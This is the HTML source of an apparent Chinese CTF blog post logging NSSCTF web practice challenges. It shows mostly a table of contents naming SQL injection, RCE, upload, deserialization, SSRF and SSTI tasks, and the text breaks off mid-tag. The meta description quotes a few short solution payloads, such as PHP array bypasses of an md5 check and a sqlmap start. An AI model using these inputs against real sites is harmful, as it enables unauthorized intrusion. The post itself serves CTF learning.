<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8" />

    

    

    <title>NSS刷题记录1-200 | 雨霖铃</title>
    <meta name="author" content="R4iny13lueB311" />
    <meta name="keywords" content="" />
    <meta name="description" content="…1.[SWPUCTF 2021 新生赛]gift_F12F122.[SWPUCTF 2021 新生赛]jicaopayload:GET json=&amp;#123;&amp;quot;x&amp;quot;:&amp;quot;wllm&amp;quot;&amp;#125;POST id=wllmNB3.[SWPUCTF 2021 新生赛]easy_md5payload:GET name[]&amp;#x3D;1POST password[]&amp;#x3D;24.[SWPUCTF 2021 新生赛]easy_sql?wllm&amp;#x3D;1sqlma" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />

    
    <link rel="alternate" href="/atom.xml" title="雨霖铃" type="application/atom+xml">
    
    
    <link rel="icon" href="/images/favicon.ico">
    

    <style type="text/css">
    @font-face {
        font-family: 'icomoon';
        src: url("/fonts/icomoon.eot?q628ml");
        src: url("/fonts/icomoon.eot?q628ml#iefix") format('embedded-opentype'),
             url("/fonts/icomoon.ttf?q628ml") format('truetype'),
             url("/fonts/icomoon.woff?q628ml") format('woff'),
             url("/fonts/icomoon.svg?q628ml#icomoon") format('svg');
        font-weight: normal;
        font-style: normal;
    }
    </style>
    
<link rel="stylesheet" href="/css/style.css">


    <!--[if lt IE 9]><style type="text/css">.nav-inner {top:0;}.author-meta {position:static;top:0;}.search-form {height:36px;}</style><script type="text/javascript" src="https://unpkg.com/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
<meta name="generator" content="Hexo 7.0.0"></head>
<body>

    <main class="app">
        <header id="header" class="header clearfix">
    <div id="nav" class="nav">
    <div class="nav-mobile">
        <button id="open-panel" class="open-panel nav-mobile-item"><i class="icon-documents"></i></button>
        <h1 class="nav-mobile-title nav-mobile-item">雨霖铃</h1>
        <button id="open-menus" class="open-panel nav-mobile-item"><i class="icon-library"></i></button>
    </div>

    <nav id="nav-inner" class="nav-inner">
        
            <a class="nav-item" href="/">
                <span class="nav-text">首页</span>
            </a>
        
            <a class="nav-item" href="/tags/CTF">
                <span class="nav-text">CTF</span>
            </a>
        
            <a class="nav-item" href="/tags/%E6%B8%97%E9%80%8F">
                <span class="nav-text">渗透</span>
            </a>
        
            <a class="nav-item" href="/tags/%E6%8A%80%E6%9C%AF%E5%8A%9B">
                <span class="nav-text">技术力</span>
            </a>
        
            <a class="nav-item" href="/archives">
                <span class="nav-text">归档</span>
            </a>
        
            <a class="nav-item" href="/about">
                <span class="nav-text">关于</span>
            </a>
        
    </nav>
</div>

    <aside id="aside" class="aside">
    <div id="aside-mask" class="aside-mask"></div>
    <div id="aside-inner" class="aside-inner">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="https://www.ayanagi.fun"></form>

        
        
        
        

        
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-F12"><span class="toc-number">1.</span> <span class="toc-text">1.[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-jicao"><span class="toc-number">2.</span> <span class="toc-text">2.[SWPUCTF 2021 新生赛]jicao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-md5"><span class="toc-number">3.</span> <span class="toc-text">3.[SWPUCTF 2021 新生赛]easy_md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easy-sql"><span class="toc-number">4.</span> <span class="toc-text">4.[SWPUCTF 2021 新生赛]easy_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-include"><span class="toc-number">5.</span> <span class="toc-text">5.[SWPUCTF 2021 新生赛]include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyrce"><span class="toc-number">6.</span> <span class="toc-text">6.[SWPUCTF 2021 新生赛]easyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-caidao"><span class="toc-number">7.</span> <span class="toc-text">7.[SWPUCTF 2021 新生赛]caidao</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-WebFTP"><span class="toc-number">8.</span> <span class="toc-text">8.[第五空间 2021]WebFTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-babyrce"><span class="toc-number">9.</span> <span class="toc-text">9.[SWPUCTF 2021 新生赛]babyrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-Do-you-know-http"><span class="toc-number">10.</span> <span class="toc-text">10.[SWPUCTF 2021 新生赛]Do_you_know_http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize"><span class="toc-number">11.</span> <span class="toc-text">11.[SWPUCTF 2021 新生赛]ez_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload2-0"><span class="toc-number">12.</span> <span class="toc-text">12.[SWPUCTF 2021 新生赛]easyupload2.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload1-0"><span class="toc-number">13.</span> <span class="toc-text">13.[SWPUCTF 2021 新生赛]easyupload1.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup"><span class="toc-number">14.</span> <span class="toc-text">14.[SWPUCTF 2021 新生赛]no_wakeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-suctf-2019-EasySQL"><span class="toc-number">15.</span> <span class="toc-text">15.[suctf 2019]EasySQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-ZJCTF-2019-NiZhuanSiWei"><span class="toc-number">16.</span> <span class="toc-text">16.[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-PseudoProtocols"><span class="toc-number">17.</span> <span class="toc-text">17.[SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-BJDCTF-2020-easy-md5"><span class="toc-number">18.</span> <span class="toc-text">18.[BJDCTF 2020]easy_md5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-NISACTF-2022-easyssrf"><span class="toc-number">19.</span> <span class="toc-text">19.[NISACTF 2022]easyssrf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-easyupload3-0"><span class="toc-number">20.</span> <span class="toc-text">20.[SWPUCTF 2021 新生赛]easyupload3.0</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error"><span class="toc-number">21.</span> <span class="toc-text">21.[SWPUCTF 2021 新生赛]error</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#22-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="toc-number">22.</span> <span class="toc-text">22.[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-NCTF-2018-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">23.</span> <span class="toc-text">23.[NCTF 2018]签到题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop"><span class="toc-number">24.</span> <span class="toc-text">24.[SWPUCTF 2021 新生赛]pop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#25-LitCTF-2023-%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA"><span class="toc-number">25.</span> <span class="toc-text">25.[LitCTF 2023]导弹迷踪</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#26-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-sql"><span class="toc-number">26.</span> <span class="toc-text">26.[SWPUCTF 2021 新生赛]sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#27-GXYCTF-2019-Ping-Ping-Ping"><span class="toc-number">27.</span> <span class="toc-text">27.[GXYCTF 2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#28-NSSCTF-2022-Spring-Recruit-ezgame"><span class="toc-number">28.</span> <span class="toc-text">28.[NSSCTF 2022 Spring Recruit]ezgame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#29-LitCTF-2023-%E6%88%91Flag%E5%91%A2%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">29.[LitCTF 2023]我Flag呢？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#30-%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="toc-number">30.</span> <span class="toc-text">30.[鹤城杯 2021]EasyP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#31-LitCTF-2023-PHP%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80%EF%BC%81%EF%BC%81"><span class="toc-number">31.</span> <span class="toc-text">31.[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#32-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-finalrce"><span class="toc-number">32.</span> <span class="toc-text">32.[SWPUCTF 2021 新生赛]finalrce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#33-NISACTF-2022-checkin"><span class="toc-number">33.</span> <span class="toc-text">33.[NISACTF 2022]checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#34-LitCTF-2023-1zjs"><span class="toc-number">34.</span> <span class="toc-text">34.[LitCTF 2023]1zjs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#35-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB"><span class="toc-number">35.</span> <span class="toc-text">35.[鹏城杯 2022]简单包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#36-LitCTF-2023-Ping"><span class="toc-number">36.</span> <span class="toc-text">36.[LitCTF 2023]Ping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#37-LitCTF-2023-Follow-me-and-hack-me"><span class="toc-number">37.</span> <span class="toc-text">37.[LitCTF 2023]Follow me and hack me</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#38-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php"><span class="toc-number">38.</span> <span class="toc-text">38.[SWPUCTF 2022 新生赛]ez_ez_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#39-LitCTF-2023-%E4%BD%9C%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">39.</span> <span class="toc-text">39.[LitCTF 2023]作业管理系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#40-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">40.</span> <span class="toc-text">40.[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#41-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-websign"><span class="toc-number">41.</span> <span class="toc-text">41.[UUCTF 2022 新生赛]websign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#42-NISACTF-2022-level-up"><span class="toc-number">42.</span> <span class="toc-text">42.[NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#43-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-checkin"><span class="toc-number">43.</span> <span class="toc-text">43.[HUBUCTF 2022 新生赛]checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#44-CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">44.</span> <span class="toc-text">44.[CISCN 2019华东南]Web11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#45-HDCTF-2023-Welcome-To-HDCTF-2023"><span class="toc-number">45.</span> <span class="toc-text">45.[HDCTF 2023]Welcome To HDCTF 2023</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#46-NISACTF-2022-babyupload"><span class="toc-number">46.</span> <span class="toc-text">46.[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#47-GDOUCTF-2023-hate-eat-snake"><span class="toc-number">47.</span> <span class="toc-text">47.[GDOUCTF 2023]hate eat snake</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#48-NISACTF-2022-babyserialize"><span class="toc-number">48.</span> <span class="toc-text">48.[NISACTF 2022]babyserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#49-NISACTF-2022-midlevel"><span class="toc-number">49.</span> <span class="toc-text">49.[NISACTF 2022]midlevel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#50-NSSCTF-2022-Spring-Recruit-babyphp"><span class="toc-number">50.</span> <span class="toc-text">50.[NSSCTF 2022 Spring Recruit]babyphp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#51-NISACTF-2022-bingdundun"><span class="toc-number">51.</span> <span class="toc-text">51.[NISACTF 2022]bingdundun~</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#52-GDOUCTF-2023-EZ-WEB"><span class="toc-number">52.</span> <span class="toc-text">52.[GDOUCTF 2023]EZ WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#53-LitCTF-2023-Vim-yyds"><span class="toc-number">53.</span> <span class="toc-text">53.[LitCTF 2023]Vim yyds</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#54-GXYCTF-2019-BabyUpload"><span class="toc-number">54.</span> <span class="toc-text">54.[GXYCTF 2019]BabyUpload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#55-GKCTF-2020-cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">55.</span> <span class="toc-text">55.[GKCTF 2020]cve版签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#56-HNCTF-2022-Week1-2048"><span class="toc-number">56.</span> <span class="toc-text">56.[HNCTF 2022 Week1]2048</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#57-LitCTF-2023-Http-pro-max-plus"><span class="toc-number">57.</span> <span class="toc-text">57.[LitCTF 2023]Http pro max plus</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#58-NISACTF-2022-popchains"><span class="toc-number">58.</span> <span class="toc-text">58.[NISACTF 2022]popchains</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#59-GDOUCTF-2023-%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="toc-number">59.</span> <span class="toc-text">59.[GDOUCTF 2023]泄露的伪装</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#60-CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1"><span class="toc-number">60.</span> <span class="toc-text">60.[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#61-HCTF-2018-Warmup"><span class="toc-number">61.</span> <span class="toc-text">61.[HCTF 2018]Warmup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#62-HNCTF-2022-Week1-Interesting-include"><span class="toc-number">62.</span> <span class="toc-text">62.[HNCTF 2022 Week1]Interesting_include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#63-NSSRound-1-Basic-basic-check"><span class="toc-number">63.</span> <span class="toc-text">63.[NSSRound#1 Basic]basic_check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#64-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">64.</span> <span class="toc-text">64.[SWPUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#65-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="toc-number">65.</span> <span class="toc-text">65.[羊城杯 2020]easycon</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#66-LitCTF-2023-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B-%EF%BC%81"><span class="toc-number">66.</span> <span class="toc-text">66.[LitCTF 2023]这是什么？SQL ！注一下 ！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#67-%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-Middle-magic"><span class="toc-number">67.</span> <span class="toc-text">67.[鹤城杯 2021]Middle magic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#68-GDOUCTF-2023-%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-number">68.</span> <span class="toc-text">68.[GDOUCTF 2023]受不了一点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#69-GKCTF-2021-easycms"><span class="toc-number">69.</span> <span class="toc-text">69.[GKCTF 2021]easycms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#70-HNCTF-2022-Week1-easy-html"><span class="toc-number">70.</span> <span class="toc-text">70.[HNCTF 2022 Week1]easy_html</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#71-HDCTF-2023-SearchMaster"><span class="toc-number">71.</span> <span class="toc-text">71.[HDCTF 2023]SearchMaster</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#72-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">72.</span> <span class="toc-text">72.[UUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#73-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-pklovecloud"><span class="toc-number">73.</span> <span class="toc-text">73.[第五空间 2021]pklovecloud</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#74-HNCTF-2022-Week1-easy-upload"><span class="toc-number">74.</span> <span class="toc-text">74.[HNCTF 2022 Week1]easy_upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#75-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection"><span class="toc-number">75.</span> <span class="toc-text">75.[第五空间 2021]yet_another_mysql_injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#76-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php-revenge"><span class="toc-number">76.</span> <span class="toc-text">76.[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#77-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5"><span class="toc-number">77.</span> <span class="toc-text">77.[SWPUCTF 2022 新生赛]奇妙的MD5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#78-%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval"><span class="toc-number">78.</span> <span class="toc-text">78.[天翼杯 2021]esay_eval</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#79-HNCTF-2022-Week1-What-is-Web"><span class="toc-number">79.</span> <span class="toc-text">79.[HNCTF 2022 Week1]What is Web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#80-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-EasyCleanup"><span class="toc-number">80.</span> <span class="toc-text">80.[第五空间 2021]EasyCleanup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#81-HNCTF-2022-Week1-Interesting-http"><span class="toc-number">81.</span> <span class="toc-text">81.[HNCTF 2022 Week1]Interesting_http</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#82-WUSTCTF-2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E"><span class="toc-number">82.</span> <span class="toc-text">82.[WUSTCTF 2020]朴实无华</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#83-LitCTF-2023-Flag%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%EF%BC%81"><span class="toc-number">83.</span> <span class="toc-text">83.[LitCTF 2023]Flag点击就送！</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#84-NISACTF-2022-is-secret"><span class="toc-number">84.</span> <span class="toc-text">84.[NISACTF 2022]is secret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#85-NISACTF-2022-middlerce"><span class="toc-number">85.</span> <span class="toc-text">85.[NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#86-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-1z-unserialize"><span class="toc-number">86.</span> <span class="toc-text">86.[SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#87-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-numgame"><span class="toc-number">87.</span> <span class="toc-text">87.[SWPUCTF 2022 新生赛]numgame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#88-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell"><span class="toc-number">88.</span> <span class="toc-text">88.[HUBUCTF 2022 新生赛]HowToGetShell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#89-NISACTF-2022-join-us"><span class="toc-number">89.</span> <span class="toc-text">89.[NISACTF 2022]join-us</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#90-NSSRound-4-SWPU-1zweb"><span class="toc-number">90.</span> <span class="toc-text">90.[NSSRound#4 SWPU]1zweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#91-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-where-am-i"><span class="toc-number">91.</span> <span class="toc-text">91.[SWPUCTF 2022 新生赛]where_am_i</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#92-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-unserialize"><span class="toc-number">92.</span> <span class="toc-text">92.[SWPUCTF 2022 新生赛]ez_ez_unserialize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#93-GDOUCTF-2023"><span class="toc-number">93.</span> <span class="toc-text">93.[GDOUCTF 2023]</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#94-HNCTF-2022-WEEK2-easy-include"><span class="toc-number">94.</span> <span class="toc-text">94.[HNCTF 2022 WEEK2]easy_include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#95-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce-3"><span class="toc-number">95.</span> <span class="toc-text">95.[SWPUCTF 2021 新生赛]hardrce_3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#96-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-js-sign"><span class="toc-number">96.</span> <span class="toc-text">96.[SWPUCTF 2022 新生赛]js_sign</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#97-HNCTF-2022-WEEK2-ez-SSTI"><span class="toc-number">97.</span> <span class="toc-text">97.[HNCTF 2022 WEEK2]ez_SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#98-GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="toc-number">98.</span> <span class="toc-text">98.[GDOUCTF 2023]反方向的钟</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#99-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-xff"><span class="toc-number">99.</span> <span class="toc-text">99.[SWPUCTF 2022 新生赛]xff</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#100-MoeCTF-2022-baby-file"><span class="toc-number">100.</span> <span class="toc-text">100.[MoeCTF 2022]baby_file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#101-CISCN-2019%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">101.</span> <span class="toc-text">101.[CISCN 2019初赛]Love Math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#102-NSSRound-8-Basic-MyDoor"><span class="toc-number">102.</span> <span class="toc-text">102.[NSSRound#8 Basic]MyDoor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#103-prize-p5"><span class="toc-number">103.</span> <span class="toc-text">103.prize_p5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#104-NCTF-2018-flask%E7%9C%9F%E9%A6%99"><span class="toc-number">104.</span> <span class="toc-text">104.[NCTF 2018]flask真香</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#105-LitCTF-2023-%E5%B0%B1%E5%BD%93%E6%97%A0%E4%BA%8B%E5%8F%91%E7%94%9F"><span class="toc-number">105.</span> <span class="toc-text">105.[LitCTF 2023]就当无事发生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#106-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-sql"><span class="toc-number">106.</span> <span class="toc-text">106.[SWPUCTF 2022 新生赛]ez_sql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#107-HDCTF-2023-YamiYami"><span class="toc-number">107.</span> <span class="toc-text">107.[HDCTF 2023]YamiYami</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#108-NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1"><span class="toc-number">108.</span> <span class="toc-text">108.[NCTF 2018]滴!晨跑打卡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#109-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-webdog1-start"><span class="toc-number">109.</span> <span class="toc-text">109.[SWPUCTF 2022 新生赛]webdog1__start</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#110-GXYCTF-2019-BabySqli"><span class="toc-number">110.</span> <span class="toc-text">110.[GXYCTF 2019]BabySqli</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#111-NSSRound-4-SWPU-ez-rce"><span class="toc-number">111.</span> <span class="toc-text">111.[NSSRound#4 SWPU]ez_rce</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#112-BJDCTF-2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4"><span class="toc-number">112.</span> <span class="toc-text">112.[BJDCTF 2020]ZJCTF，不过如此</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#113-%E9%B9%8F%E5%9F%8E%E6%9D%AF-2022-%E7%AE%80%E5%8D%95%E7%9A%84php"><span class="toc-number">113.</span> <span class="toc-text">113.[鹏城杯 2022]简单的php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#114-HGAME-2023-week1-Classic-Childhood-Game"><span class="toc-number">114.</span> <span class="toc-text">114.[HGAME 2023 week1]Classic Childhood Game</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#115-NISACTF-2022-hardsql"><span class="toc-number">115.</span> <span class="toc-text">115.[NISACTF 2022]hardsql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#116-%E5%AE%89%E6%B4%B5%E6%9D%AF-2020-Normal-SSTI"><span class="toc-number">116.</span> <span class="toc-text">116.[安洵杯 2020]Normal SSTI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#117-MoeCTF-2022-ezhtml"><span class="toc-number">117.</span> <span class="toc-text">117.[MoeCTF 2022]ezhtml</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#118-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-funny-php"><span class="toc-number">118.</span> <span class="toc-text">118.[SWPUCTF 2022 新生赛]funny_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#119-HNCTF-2022-WEEK2-ez-ssrf"><span class="toc-number">119.</span> <span class="toc-text">119.[HNCTF 2022 WEEK2]ez_ssrf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 